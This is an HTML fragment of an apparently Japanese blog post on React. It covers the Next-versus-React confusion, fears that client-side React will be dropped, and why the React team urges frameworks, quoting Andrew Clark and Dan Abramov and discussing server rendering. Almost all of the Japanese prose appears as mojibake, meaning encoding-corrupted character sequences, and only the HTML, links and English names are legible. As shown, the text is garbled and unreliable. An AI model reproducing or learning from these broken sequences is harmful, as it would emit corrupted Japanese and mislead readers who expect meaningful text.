<p>ã—ã‹ã—ã€ã“ã‚Œã¯åŒæ™‚ã«ã€Reactã€ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ãˆã€ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã€ãã—ã¦Vercelã®å½±éŸ¿åŠ›ã‚’ã‚ãã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°ãŒã„ã‹ã«æ··ä¹±ã—ã¦ã„ã‚‹ã‹ã‚’ç‰©èªã£ã¦ã„ã¾ã™ã€‚</p>
<p>ã“ã‚Œã«éå¸¸ã«é–¢é€£ã—ãŸã€ŒNextã¨Reactã€ã©ã¡ã‚‰ã‚’ä½¿ã†ã¹ãã‹ï¼Ÿã€ã¨ã„ã†è³ªå•ã‚‚ä»˜ã‘åŠ ãˆã¦ãŠãã¾ã™ã€‚ã“ã‚Œã‚‚é »ç¹ã«ç›®ã«ã—ã¾ã™ã€‚æ–‡å­—é€šã‚Šã«èª­ã‚ã°ã€ã€ŒNextã€ã¨ã€ŒReactã€ã¯åˆ¥ç‰©ã ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã“ã‚Œã‚‚æ˜ã‚‰ã‹ã«é–“é•ã„ã§ã™ã€‚Nextã¯Reactãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã™ã‚‹ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã™ã€‚ãã‚Œã¯ã‚¹ãƒ¼ãƒ‘ãƒ¼ã‚»ãƒƒãƒˆã§ã‚ã‚Šã€ç«¶åˆç›¸æ‰‹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã»ã¨ã‚“ã©ã®äººãŒæ„å›³ã—ã¦ã„ã‚‹ã®ã¯ã€ã€ŒNextã‚’ä½¿ã†ã¹ãã‹ã€ãã‚Œã¨ã‚‚CRAã‚„Viteã®ã‚ˆã†ãªã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰SPAã‚’ä½¿ã†ã¹ãã‹ï¼Ÿã€ã¨ã„ã†ã“ã¨ã ã¨æ€ã„ã¾ã™ãŒã€ãã‚Œã‚’æ˜ç¢ºã«è¿°ã¹ã‚‹èªå½™ã‚’æŒã£ã¦ã„ãªã„ã®ã§ã™ã€‚</p>
<p>ã“ã‚Œã‚‚ã¾ãŸã€ã“ã“ã§ã®å¢ƒç•Œç·šã«ã¤ã„ã¦ã©ã‚Œã»ã©ã®æ··ä¹±ãŒã‚ã‚‹ã‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚</p>
<h3>æ‡¸å¿µï¼šReactãŒã„ã¤ã‹ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¢ãƒ—ãƒªã§å‹•ã‹ãªããªã‚‹ã‹ã‚‚ã—ã‚Œãªã„</h3>
<p>ã“ã®æ‡¸å¿µã‚‚ã‚ˆãç›®ã«ã—ã¾ã™ã€‚æ‡¸å¿µã¯ã€ã€Œã‚‚ã—Reactãƒãƒ¼ãƒ ãŒã‚µãƒ¼ãƒãƒ¼ã‚’å¿…è¦ã¨ã™ã‚‹æ©Ÿèƒ½ã«ã“ã‚Œã»ã©ã®é‡ç‚¹ã¨åŠ´åŠ›ã‚’æ³¨ã„ã§ã„ã‚‹ãªã‚‰ã€ãã‚Œã¯ã„ã¤ã‹ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®æ©Ÿèƒ½ãŒå¤‰ã‚ã£ãŸã‚Šãªããªã£ãŸã‚Šã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã‹ï¼Ÿã€ã¨ã„ã†ã‚‚ã®ã§ã™ã€‚</p>
<p>äººã€…ãŒã“ã®ææ€–ã‚’æŠ±ãç†ç”±ã¯ç†è§£ã§ãã¾ã™ã€‚ãã‚Œã¯ã€Reactãƒãƒ¼ãƒ ã‹ã‚‰ã®ãƒˆãƒ¼ãƒ³ã¨é‡ç‚¹ã®å¤§ããªå¤‰åŒ–ã€ãã—ã¦å½¼ã‚‰ãŒã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®æ©Ÿèƒ½ã«æ³¨ã„ã§ããŸåŠ´åŠ›ã®é‡ã«ã‚ˆã£ã¦å¼•ãèµ·ã“ã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ã“ã‚ŒãŒæ±ºã—ã¦èµ·ã“ã‚Šãˆãªã„ã“ã¨ã‚‚æ˜ã‚‰ã‹ã§ã™ã€‚Reactã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°æ©Ÿèƒ½ã¯ã€æ±ºã—ã¦ãªããªã‚Šã¾ã›ã‚“ï¼ Metaè‡ªèº«ãŒä½•ç™¾ä¸‡è¡Œã‚‚ã®æ—¢å­˜ã®Reactã‚³ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ã‚‹ã¨ã„ã†äº‹å®Ÿã ã‘ã§ã‚‚ã€ãã‚ŒãŒåˆ†ã‹ã‚Šã¾ã™ã€‚ãã®ä¸Šã€Reactãƒãƒ¼ãƒ ã¯å¸¸ã«ã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ™ãƒ«ã®å¾Œæ–¹äº’æ›æ€§ã«é–¢ã—ã¦éå¸¸ã«å„ªã‚Œã¦ãã¾ã—ãŸ - ç ´å£Šçš„å¤‰æ›´ã‚’è¨˜è¿°ã—ã€éæ¨å¥¨ã®æ©Ÿèƒ½ã‚’æœ€çµ‚çš„ã«å‰Šé™¤ã™ã‚‹ã¾ã§ä½•å¹´ã‚‚ä¿æŒã—ã€ç§»è¡Œã‚¬ã‚¤ãƒ‰ã‚„codemodã‚’æä¾›ã—ã¦ãã¾ã—ãŸã€‚</p>
<p>ã¾ãŸã€React 19ã¨19.1ã®æ©Ÿèƒ½ã®å¤šãã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå°‚ç”¨ã§ã‚ã‚‹ã“ã¨ã«ã‚‚æ³¨ç›®ã™ã‚‹ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚ã©ã¡ã‚‰ã‹ã¨è¨€ãˆã°ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®æ©Ÿèƒ½ã«æ³¨ãŒã‚ŒãŸåŠ´åŠ›ã‚’éå¤§è©•ä¾¡ã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®æ©Ÿèƒ½ã«æ³¨ãŒã‚ŒãŸåŠ´åŠ›ã‚’è¦‹é€ƒã—ã¦ãã¾ã—ãŸã€‚</p>
<h3>æ‡¸å¿µï¼šãªãœReactã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æ¨ã™ã®ã‹</h3>
<p>ãã—ã¦ã€æ¬¡ã®è­°è«–ã«ã¤ãªãŒã‚Šã¾ã™ã€‚ãªãœReactãƒãƒ¼ãƒ ã¯ã€ã€Œãã†ã—ãªã„ã¨é–“é•ã„ã ã€ã¨è¨€ã£ã¦ã¾ã§ã€å…¨ã¦ã®Reactãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ã‚ã›ã‚‹ã“ã¨ã«ãã‚Œã»ã©å›ºåŸ·ã™ã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ</p>
<p>ã“ã‚Œã¯ã€ç§ãŒã‚ˆã‚Šå¤šãã®å…±æ„Ÿã¨åŒæ„Ÿã‚’æŒã¤æ‡¸å¿µã§ã™ã€‚ç§ã¯å½¼ã‚‰ãŒã€ŒNextã‚’ä½¿ã‚ã›ã¦Vercelã§ãƒ›ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã•ã›ã‚ˆã†ã€ã¨ã„ã†ç›®æ¨™ã§ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ãˆã€ã¨è¨€ã£ã¦ã„ã‚‹ã®ã§ã¯ãªã„ã¨è¿°ã¹ã¾ã—ãŸãŒã€ã§ã¯ãã®ç†ç”±ã¯ä½•ãªã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ</p>
<h4>Reactãƒãƒ¼ãƒ ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã«å¯¾ã™ã‚‹è¦‹è§£</h4>
<p>Andrew Clarkã®<a href="https://x.com/acdlite/status/1617667097424986114">2023å¹´1æœˆã®ãƒ„ã‚¤ãƒ¼ãƒˆã¯ã€ãã®æ„å›³ã‚’ã‹ãªã‚Šæ˜ç¢ºã«è¿°ã¹ã¦ã„ã¾ã™</a>ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Reactã‚’ä½¿ã†ãªã‚‰ã€Reactãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ã†ã¹ãã ã€‚æ—¢å­˜ã®ã‚¢ãƒ—ãƒªãŒãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ã£ã¦ã„ãªã‘ã‚Œã°ã€æ®µéšçš„ã«ç§»è¡Œã™ã¹ãã ã€‚æ–°ã—ã„Reactãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ãªã‚‰ã€æœ€åˆã‹ã‚‰ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ã†ã¹ãã ã€‚</p><p>ã‚ãªãŸãŒé¸ã¶Reactãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã«ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®ãŸã‚ã®çµ„ã¿è¾¼ã¿ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚ã‚‹ã¹ãã ã€‚ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã“ã‚Œã‚‰ã‚’ç‹¬ç«‹ã—ãŸæ‡¸å¿µã¨ã—ã¦æ‰±ã‚ãªã„ â€” æ·±ãçµ±åˆã•ã‚ŒãŸã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã€ä½¿ã„ã‚„ã™ãã€ç®±ã‹ã‚‰å‡ºã—ã¦ã™ãã«å„ªã‚ŒãŸãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒå¾—ã‚‰ã‚Œã‚‹ã€‚</p><p>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æ”¾æ£„ã™ã‚‹ã“ã¨ã‚’é¸ã¶ãªã‚‰ã€ã‚ãªãŸãŒæœ¬å½“ã«é¸ã‚“ã§ã„ã‚‹ã®ã¯ã€è‡ªåˆ†å°‚ç”¨ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ã§ã‚ã‚Šã€ãã‚Œã¯ãŠãã‚‰ãæ—¢è£½å“ã‚ˆã‚Šã‚‚ã¯ã‚‹ã‹ã«æ‚ªã„ã‚‚ã®ã«ãªã‚‹ã ã‚ã†ã€‚ãŸã¨ãˆã‚ãªãŸã®ç‰¹æ³¨ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒä»Šæ—¥ã®ä»£æ›¿å“ã‚ˆã‚Šå„ªã‚Œã¦ã„ã‚‹ã¨æ€ã£ã¦ã‚‚ã€ä¸€å¹´å¾Œã‚‚ãã†ã ã‚ã†ã‹ï¼Ÿ</p><p>æœ€æ–°æŠ€è¡“ã«è¿½ã„ã¤ãã«ã¯å¤šãã®æ™‚é–“ã¨ã‚¨ãƒãƒ«ã‚®ãƒ¼ãŒã‹ã‹ã‚‹ã€‚ã‚ãªãŸã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ãƒ¡ãƒ³ãƒ†ãƒŠãƒ¼ã«ãªã‚‹æº–å‚™ãŒã§ãã¦ã„ã‚‹ã‹ï¼Ÿãã‚Œã¨ã‚‚ã€ã‚ãªãŸã®æ™‚é–“ã‚’ã‚‚ã£ã¨æœ‰åŠ¹ã«ä½¿ã†ã¹ãã“ã¨ãŒã‚ã‚‹ã®ã§ã¯ãªã„ã‹ï¼Ÿ</p><p>ãã‚Œä»¥æ¥å¤‰ã‚ã£ãŸä¸»ãªã“ã¨ã¯ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒæœ¬å½“ã«ã€æœ¬å½“ã«è‰¯ããªã£ãŸã“ã¨ã ã€‚ã‹ã¤ã¦ã¯ãƒ—ãƒ¬ãƒ¼ãƒ³ãªReact + WebpackãŒã€ã‚ªãƒ¼ãƒ«ã‚¤ãƒ³ãƒ¯ãƒ³ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨åŒç­‰ã‹ãã‚Œä»¥ä¸Šã ã£ãŸã€‚ç§ã®æ„è¦‹ã§ã¯ã€ã‚‚ã¯ã‚„ãã†ã§ã¯ãªã„ã€‚</p><p>å•é¡Œã¯ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ã‚ãšã«Reactã‚¢ãƒ—ãƒªã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã‹ã©ã†ã‹ã§ã¯ãªã„ã€‚ãã®é¸æŠè‚¢ã¯å¸¸ã«å­˜åœ¨ã™ã‚‹ã€‚å•é¡Œã¯ã€ã‚ãªãŸã®è‡ªå®¶è£½ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãŒã€æ©Ÿèƒ½ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã€DXã«ãŠã„ã¦æ¥­ç•Œã®ãƒªãƒ¼ãƒ€ãƒ¼ã¨ç«¶äº‰ã§ãã‚‹ã‹ã©ã†ã‹ã ã€‚ãã®ãƒãƒ¼ãƒ‰ãƒ«ã¯å¸¸ã«ä¸ŠãŒã£ã¦ã„ã‚‹ã€‚</p></div></div>
<p>åŒæ§˜ã«ã€Dan AbramovãŒCRAã‚’<a href="https://github.com/reactjs/react.dev/pull/5487#issuecomment-1409720741">éæ¨å¥¨ã¨è¦‹ãªã™ç†ç”±ã‚’èª¬æ˜ã—ãŸ</a>éš›ã«ã‚‚ï¼š</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Create React Appã¯å•é¡Œã®ä¸€å´é¢ã—ã‹è§£æ±ºã—ãªã‹ã£ãŸã€‚ãã‚Œã¯ï¼ˆå½“æ™‚ã¨ã—ã¦ã¯ï¼ï¼‰è‰¯ã„é–‹ç™ºä½“é¨“ã‚’æä¾›ã—ãŸãŒã€Webã®å¼·ã¿ã‚’æ´»ã‹ã—ã¦è‰¯ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½“é¨“ã‚’å¾—ã‚‹ãŸã‚ã®ååˆ†ãªæ§‹é€ ã‚’èª²ã•ãªã‹ã£ãŸã€‚ã“ã‚Œã‚‰ã®å•é¡Œã‚’è‡ªåˆ†ã§è§£æ±ºã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ã‚‚ã§ããŸãŒã€ãã®ãŸã‚ã«ã¯ã€Œejectã€ã—ã¦ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã‚’å¤§å¹…ã«ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ãã‚Œã§ã¯Create React Appã®è¶£æ—¨ãŒæãªã‚ã‚Œã¦ã—ã¾ã†ã€‚æœ¬å½“ã«åŠ¹ç‡çš„ãªReactã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã¯å…¨ã¦ã‚«ã‚¹ã‚¿ãƒ ã§ã€ç•°ãªã‚Šã€Create React Appã§ã¯é”æˆä¸å¯èƒ½ã ã£ãŸã€‚</p><p>ã“ã‚Œã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½“é¨“ã®å•é¡Œã¯Create React Appã«ç‰¹æœ‰ã®ã‚‚ã®ã§ã¯ãªã„ã€‚Reactã«ç‰¹æœ‰ã§ã•ãˆãªã„ã€‚ä¾‹ãˆã°ã€Viteã®ãƒ›ãƒ¼ãƒ ãƒšãƒ¼ã‚¸ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‹ã‚‰ä½œæˆã•ã‚ŒãŸPreactã€Vueã€Litã€Svelteã®ã‚¢ãƒ—ãƒªã¯å…¨ã¦åŒã˜å•é¡Œã«è‹¦ã—ã‚“ã§ã„ã‚‹ã€‚ã“ã‚Œã‚‰ã®å•é¡Œã¯ã€é™çš„ã‚µã‚¤ãƒˆç”Ÿæˆï¼ˆSSGï¼‰ã‚„ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆSSRï¼‰ã®ãªã„ã€ç´”ç²‹ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ã‚¢ãƒ—ãƒªã«å›ºæœ‰ã®ã‚‚ã®ã§ã‚ã‚‹ã€‚</p><p>Reactã§ã‚¢ãƒ—ãƒªå…¨ä½“ã‚’æ§‹ç¯‰ã™ã‚‹å ´åˆã€SSG/SSRã‚’ä½¿ç”¨ã§ãã‚‹ã“ã¨ã¯é‡è¦ã ã€‚Create React Appã«ãã‚Œã‚‰ã®ã‚µãƒãƒ¼ãƒˆãŒãªã„ã“ã¨ã¯ ç›®ã«ä½™ã‚‹æ¬ ç‚¹ã ã€‚ã—ã‹ã—ã€Create React AppãŒé…ã‚Œã¦ã„ã‚‹ã®ã¯ãã‚Œã ã‘ã§ã¯ãªã„ã€‚</p><p>Reactè‡ªä½“ã¯ãŸã ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã ã€‚ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚„ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã®æ–¹æ³•ã‚’è¦å®šã—ãªã„ã€‚Create React Appã‚‚åŒæ§˜ã ã€‚æ®‹å¿µãªãŒã‚‰ã€ã“ã‚Œã¯Reactå˜ä½“ã§ã‚‚ã€å…ƒã€…è¨­è¨ˆã•ã‚ŒãŸCreate React Appã§ã‚‚ã€ã“ã‚Œã‚‰ã®å•é¡Œã‚’è§£æ±ºã§ããªã„ã“ã¨ã‚’æ„å‘³ã™ã‚‹ã€‚ã”è¦§ã®é€šã‚Šã€ã“ã‚Œã¯å˜ä¸€ã®æ¬ è½ã—ãŸæ©Ÿèƒ½ã«é–¢ã™ã‚‹è©±ã§ã¯ãªã„ã€‚ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ â€” ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã¨é™çš„ç”Ÿæˆã€ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã€ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã€ãã—ã¦ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚° â€” ã¯ç›¸äº’ã«é–¢é€£ã—ã¦ã„ã‚‹ã€‚</p><p>æ™‚ä»£ã¯å¤‰ã‚ã£ãŸã€‚ä»Šã§ã¯ã€ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ã‚’æŒãŸãªã„ã“ã¨ã«å›ºå®šã•ã‚Œã‚‹ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ¨å¥¨ã™ã‚‹ã“ã¨ã¯ã¾ã™ã¾ã™å›°é›£ã«ãªã£ã¦ã„ã‚‹ã€‚ãŸã¨ãˆã™ãã«å…¨ã¦ã‚’ä½¿ã‚ãªãã¦ã‚‚ã€å¿…è¦ãªã¨ãã«ã¯åˆ©ç”¨å¯èƒ½ã§ã‚ã‚‹ã¹ãã ã€‚ãã‚Œã‚‰ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã«åˆ¥ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«ç§»è¡Œã—ã€å…¨ã¦ã®ã‚³ãƒ¼ãƒ‰ã‚’å†æ§‹ç¯‰ã™ã‚‹å¿…è¦ã¯ãªã„ã¯ãšã ã€‚åŒæ§˜ã«ã€å…¨ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã‚„ã‚³ãƒ¼ãƒ‰åˆ†å‰²ãŒãƒ«ãƒ¼ãƒˆãƒ™ãƒ¼ã‚¹ã§ã‚ã‚‹å¿…è¦ã¯ãªã„ã€‚ã—ã‹ã—ã€ãã‚Œã¯ã»ã¨ã‚“ã©ã®Reactã‚¢ãƒ—ãƒªã§åˆ©ç”¨å¯èƒ½ã§ã‚ã‚‹ã¹ãè‰¯ã„ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã ã€‚</p></div></div>
<p>ç§ã¯Reactãƒãƒ¼ãƒ ã¨ã®ä¼šè©±ã§ã€Reactã‚¢ãƒ—ãƒªã®èª­ã¿è¾¼ã¿æ™‚é–“ãŒé…ãã€å…¨ä½“çš„ãªãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒæ‚ªã„ã¨ã„ã†å¤–éƒ¨ã‹ã‚‰ã®å¤šãã®ä¸æº€ã‚’èã„ã¦ã„ã‚‹ã¨ç›´æ¥è¨€ã‚ã‚ŒãŸã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ã§ã™ã‹ã‚‰ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®é‡è¦–ã¯ãã‚Œã«å¯¾ã™ã‚‹ç›´æ¥çš„ãªåå¿œã§ã‚ã‚Šã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚ˆã‚Šå¤šãã®ã‚¢ãƒ—ãƒªãŒã¾ã¨ã‚‚ãªãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æŒã¤ã‚ˆã†ã«ã™ã‚‹ã¨ã„ã†ç›®æ¨™ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ãã‚Œã«åŸºã¥ãã¨ã€Reactãƒãƒ¼ãƒ ã®ã‚¹ã‚¿ãƒ³ã‚¹ã¯æ¬¡ã®ã‚ˆã†ã«è¦ç´„ã§ãã¾ã™ï¼š</p>
<ul>
<li>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã«ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®ãŸã‚ã®çµ„ã¿è¾¼ã¿ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒã‚ã‚Šã€ãã‚Œã‚‰ã¯é€£æºã—ã¦å‹•ä½œã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã‚‹</li>
<li>ãã‚Œã‚‰ã¯å…¨ã¦ç®±ã‹ã‚‰å‡ºã—ã¦ã™ãã«æä¾›ã•ã‚Œã‚‹ãŸã‚ã€éƒ¨å“ã‚’é¸ã‚“ã§çµ„ã¿åˆã‚ã›ã‚‹ï¼ˆã†ã¾ãé€£æºã—ãªã„ã‹ã‚‚ã—ã‚Œãªã„ï¼‰æ™‚é–“ã‚’è²»ã‚„ã™å¿…è¦ãŒãªã„</li>
<li>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ãƒ“ãƒ«ãƒ‰è¨­å®šã‚„ã‚ˆã‚Šè‰¯ã„ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒãƒ‘ã‚¿ãƒ¼ãƒ³ã«ã‚ˆã‚Šã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚ˆã‚Šè‰¯ã„ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã«ã¤ãªãŒã‚‹</li>
<li>ã•ã‚‰ã«ã€React Server Componentsã¯ã€æ­£ã—ãå‹•ä½œã™ã‚‹ãŸã‚ã«ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¸ã®çµ±åˆãŒå¿…è¦ã§ã‚ã‚‹</li>
</ul>
<p>ã“ã‚Œã‚‰ã®æ‡¸å¿µã¯ã€Reactãƒãƒ¼ãƒ ãŒä»Šæ—¥ReactãŒã©ã®ã‚ˆã†ã«ä½¿ç”¨ã•ã‚Œã‚‹ã¹ãã ã¨æ„Ÿã˜ã¦ã„ã‚‹ã‹ã«ã¨ã£ã¦æ¥µã‚ã¦é‡è¦ã§ã‚ã‚‹</p>
<p>è¨€ã„æ›ãˆã‚Œã°ã€ãã‚Œã¯ã‚¤ãƒ‡ã‚ªãƒ­ã‚®ãƒ¼çš„ãªã‚¹ã‚¿ãƒ³ã‚¹ã€ã€Œã“ã‚Œã¯ã‚ãªãŸã®æ™‚é–“ã¨åŠ´åŠ›ã‚’ç¯€ç´„ã™ã‚‹ã€ã¨ã„ã†ä¿¡å¿µã€ãã—ã¦ã€Œã»ã¨ã‚“ã©ã®Reactã‚¢ãƒ—ãƒªã¯åŒæ§˜ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã«å¾“ã„ã€åŒæ§˜ã®ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å¿…è¦ã¨ã™ã‚‹ã€ã¨ã„ã†ä¿¡å¿µã®çµ„ã¿åˆã‚ã›ãªã®ã§ã™ã€‚</p>
<h3>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€SSRã€ãã—ã¦SPA</h3>
<p>ã¾ãŸã€ã€Œã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨ã„ã†ç‰¹å®šã®è¨€åŠã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ä¸€èˆ¬çš„ã«ã€Reactãƒãƒ¼ãƒ ã¨ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®ä»–ã®ä¸»è¦ãƒ¡ãƒ³ãƒãƒ¼ï¼ˆRemix / React Routerã®Ryan Florenceã¨Michael Jacksonãªã©ï¼‰ã®ä¸¡æ–¹ãŒã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã®ã€Œã‚¦ã‚©ãƒ¼ã‚¿ãƒ¼ãƒ•ã‚©ãƒ¼ãƒ«ã€ï¼ˆä¾‹ãˆã°ã€<code class="language-text">&lt;List></code>ãŒã‚¢ã‚¤ãƒ†ãƒ ã®ã‚»ãƒƒãƒˆã‚’ãƒ•ã‚§ãƒƒãƒã—ã€ãã®å­ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã—ã€<code class="language-text">&lt;ListItem></code>ãŒãƒã‚¦ãƒ³ãƒˆå¾Œã«ç‹¬è‡ªã®ãƒ•ã‚§ãƒƒãƒã‚’è¡Œã†ãªã©ï¼‰ã‚’é¿ã‘ã‚‹ãŸã‚ã«ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’è¡Œã†å¿…è¦æ€§ã‚’å¼·ãå¼·èª¿ã—ã¦ãã¾ã—ãŸã€‚Nextã‚„Remixã®ã‚ˆã†ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ç®±ã‹ã‚‰å‡ºã—ã¦ã™ãã«ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã‚ˆã†ã«ç‰¹åˆ¥ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
